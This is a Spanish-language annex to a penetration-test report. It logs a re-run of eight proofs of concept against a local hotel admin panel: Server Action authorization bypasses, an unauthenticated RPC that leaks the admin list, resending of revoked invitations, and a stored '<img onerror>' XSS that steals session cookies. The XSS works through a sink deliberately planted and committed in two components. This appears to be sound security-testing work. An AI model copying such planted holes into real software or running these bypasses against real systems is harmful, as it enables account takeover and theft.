> habían sido consumidas/borradas por una PoC anterior (ver detalle por PoC abajo). Las secciones de arriba
> (pasos reproducibles, análisis, causa raíz) **siguen vigentes sin cambios** — este anexo documenta
> únicamente la evidencia y los valores (UUIDs, nombres de cuenta) de esta segunda ejecución.
>
> **Carpeta de evidencia:** `docs/proyecto-seguridad/users/evidencias_r2/` (separada de `evidencias/` para no
> mezclar ambas rondas). Convención de nombres: `J2-POC-<N>_<paso>_<descripción>.jpg`.

### Estado del entorno al momento de esta re-ejecución
- Mismo proceso de `pnpm dev` (`apps/panel-admin` en `:3002`) sin reiniciar desde la sesión original — los
  `Next-Action` id de cada Server Action **se confirmaron estables** (se repitió cada baseline legítimo antes
  de cada bypass, no se asumieron de memoria).
- Base de datos **sin resetear** — se reutilizan las cuentas que ya existían (`owner@hotel.local`,
  `admin@hotel.local`, y cuentas `*-r2`/`*-v2` creadas en sesiones de trabajo previas) y se crean cuentas
  nuevas solo donde la PoC original había consumido/borrado la cuenta objetivo.

### J2-POC-1 — sin cambios de valores
Mismo `Next-Action` (`6023e40c6f0da1c104f50cdb47fa6ba82529075490`), mismas cuentas (`owner@hotel.local`,
`admin@hotel.local`). Evidencia nueva: `J2-POC-1_00` (baseline owner), `J2-POC-1_01` (403 UI de
`admin@hotel.local`), `J2-POC-1_02` (bypass, `200 {"success":true}`, email de prueba
`pwned-j2poc1-r2@hotel.local`), `J2-POC-1_03` (owner verifica la invitación fraudulenta).

### J2-POC-2 — sin cambios de valores
Mismo `Next-Action` (`409b06a19cd4f0b05120ddc3101f7e31787f6154f3`). Evidencia nueva: `J2-POC-2_00` (baseline,
drawer de `admin@hotel.local` abierto por el owner), `J2-POC-2_01` (403 UI), `J2-POC-2_02` (bypass: `admin@hotel.local`
consulta los permisos del owner — `200 OK` con los 14 permisos completos, capturado con la request visible en
el panel Network).

### J2-POC-3 — cuenta objetivo reemplazada
La cuenta `j2poc3-target@hotel.local` original fue **borrada** por J2-POC-7 en la sesión anterior (consecuencia
real del propio hallazgo de O6), así que se creó una cuenta de reemplazo, **`j2poc3-target-r2@hotel.local`**
(UUID `0e16146f-4df8-470d-8492-3f9efb5da88f`), invitada y activada igual que la original. `admin@hotel.local`
se reconfiguró de nuevo con el único permiso `permissions:manage` (mismo `Next-Action`,
`6090dad2b1d560459c7d974eaba42afb031ebd8aba`). Evidencia nueva: `J2-POC-3_00` (owner reconfigura a
`admin@hotel.local`), `J2-POC-3_01` (403, menú reducido a solo "Métricas"), `J2-POC-3_02` (bypass: delegación
a `j2poc3-target-r2` de `["permissions:manage","admins:revoke","audit:view"]`, `200 {"success":true}`),
`J2-POC-3_03` (owner verifica que el target quedó exactamente con esos 3 permisos).

### J2-POC-4 — sin cambios de valores
Mismas dos advertencias reales de consola de Supabase SDK, confirmadas de nuevo vía
`browser_console_messages` del MCP de Playwright en esta sesión (texto idéntico al documentado arriba,
orígenes `getInitialAuthStatus.ts:25` y `requirePermission.ts:28`). **Limitación de esta ronda:** no fue
posible cambiar a la pestaña "Console" de DevTools en la captura de escritorio porque el navegador está
concedido en modo de solo lectura para el control de escritorio (no admite clics dentro del propio DevTools,
solo navegación de página vía el MCP de Playwright); la captura `J2-POC-4_01` muestra el badge de
errores/advertencias de DevTools (🔴3 🔺6-12, varía según la sesión) como constancia visual de que las
advertencias están ocurriendo en tiempo real, y el texto exacto de ambas advertencias queda documentado
arriba (extraído programáticamente, no transcrito a mano).

### J2-POC-5 — cuenta objetivo reemplazada (misma que J2-POC-3)
Se usó la misma cuenta `j2poc3-target-r2@hotel.local`, reconfigurada por el owner con el único permiso
`admins:disable` (mismo `Next-Action` de `updateUserPermissions`). Mismo `Next-Action` de
`toggleAdminStatus` (`7f89d617713f9e9176b60d316965d6c72fd6733eba`), confirmado estable con un toggle de
prueba sobre `pwned-j2poc1@hotel.local` (desactivado y reactivado de inmediato). Evidencia nueva:
`J2-POC-5_00` (baseline), `J2-POC-5_01` (403, solo "Métricas"), `J2-POC-5_02` (bypass: `j2poc3-target-r2`
desactiva al owner, `200 {"success":true}`), `J2-POC-5_03` (verificación: login exitoso del owner después de
reactivarlo desde la misma sesión de bajo privilegio — ciclo completo confirmado).

### J2-POC-6 — sin cambios de valores
Mismo RPC (`POST /rest/v1/rpc/get_admins`), misma `apikey` anon pública. Evidencia nueva: `J2-POC-6_00`
(pantalla de login sin sesión activa, constancia de que no hay cookie), `J2-POC-6_01` (bypass: `200 OK`, 6
administradores devueltos sin header `Authorization`, con la pantalla de login de fondo y la request visible
en el panel Network).

### J2-POC-7 — ambas partes repetidas con datos reales de esta sesión
**Parte A:** se revocó la invitación **aceptada** de `j2poc3-target-r2@hotel.local` (id
`8ea11e09-eb6d-43b5-ad05-8f30b6c15524`, mismo `Next-Action`, `7fde44704de7975394b3553611471a916837ae78ce`).
Evidencia: `J2-POC-7a_00` (estado "Aceptada" antes), `J2-POC-7a_01` (`200 {"success":true}`),
`J2-POC-7a_02` (verificación: el total de administradores bajó de 6 a 5, la cuenta desapareció por completo
de `/admin/admins`). **Parte B:** se reutilizó la invitación `baseline-owner-test@hotel.local` ya revocada
en la sesión original (id `9ecb72fb-4e8b-4396-893e-c27fcd1e7ea1`, status `"revoked"` confirmado antes de la
llamada) y se le aplicó `resendInvitation` (mismo `Next-Action`, `7f60626a92af2dc6f47e881189cffa433f1241b5a7`)
→ `200 {"success":true}`. Evidencia: `J2-POC-7b_01`.

### J2-POC-8 — sin cambios de código, evidencia renovada del exploit en vivo
El sink introducido sigue **vigente** en `AdminsTable.tsx`/`PermissionDrawer.tsx` (confirmado con
`git diff --stat` al inicio de esta ronda: únicamente esos dos archivos difieren de `develop`). La cuenta
`j2poc8-xss-v2@hotel.local` (payload `<img onerror>`) sigue activa y dispara el robo de cookie **en cada
carga** de `/admin/admins` por cualquier sesión que vea esa fila — se confirmó de nuevo con una sesión nueva
del owner, capturando el banner rojo con el `document.cookie` real de esa sesión (JWT completo) junto con el
panel Network de DevTools visible. Evidencia: `J2-POC-8_01` (reemplaza a la evidencia original con el mismo
hallazgo, confirmado de nuevo end-to-end en esta sesión).

### O7/O8 y punto extra de O5 — verificados por Seph después de esta ronda
Estos dos puntos no forman parte de la re-ejecución de las 8 PoCs (no necesitaban repetirse: nunca se habían
podido correr en primer lugar). Seph los verificó manualmente después de cerrar esta ronda, con su propio
navegador y terminal:
- **O7/O8** → confirmado como hallazgo real. Ver **J2-POC-9** (sección nueva, arriba) para el detalle
  completo y la evidencia.
- **Punto extra de O5** (`signOut(adminId)` con UUID) → resultado negativo, no genera hallazgo nuevo. Ver
  la subsección "Verificación adicional" dentro de **J2-POC-5** (arriba).
- Evidencia de ambos guardada también en `evidencias_r2/`, mismo convenio de nombres (ver sección 6 de
  `comprobacion.md` para los nombres de archivo exactos acordados con Seph).

### Estado final del entorno al cierre de esta ronda
- **6 invitaciones** en estado `"accepted"` o `"pending"` con cuentas activas reales; **3** en estado
  `"revoked"` (incluida la nueva, `j2poc3-target-r2`, borrada por J2-POC-7a de esta ronda).
- **5 administradores activos**: `admin@hotel.local` (permisos: `permissions:manage` — dejado así por
  J2-POC-3/5, reflejando el estado final de las PoCs, no el estado original sembrado), `owner@hotel.local`
  (activo, reactivado), `j2poc8-xss-v2@hotel.local` y `j2poc8-xss@hotel.local` (cuentas del payload XSS,
  dejadas intencionalmente para que el sink de J2-POC-8 se siga pudiendo demostrar), `pwned-j2poc1@hotel.local`
  (activo, `is_active=true`, restaurado al estado original tras el toggle de prueba de J2-POC-5).
- El código de `apps/panel-admin` **no cambió** en esta ronda — los dos archivos de J2-POC-8 ya estaban
  commiteados; esta ronda solo generó evidencia nueva y modificó datos (permisos, invitaciones) vía las
  propias Server Actions vulnerables, que es exactamente el comportamiento que cada PoC documenta.
- **Siguiente paso para Seph:** revisar la carpeta `evidencias_r2/` (las 23 imágenes de la re-ejecución de
  las 8 PoCs + las nuevas de O7/O8 y del punto extra de O5), hacer `git add` de todo eso + este documento
  actualizado, y usar el mensaje de commit / PR de `comprobacion.md` (actualizado en la misma sesión) para
  el PR de Fase 2. El código fuente (`AdminsTable.tsx`, `PermissionDrawer.tsx`) ya estaba commiteado de una
  sesión anterior — verificar con `git status` antes de hacer commit para confirmar que no hay cambios de
  código pendientes, solo evidencia y documentación.
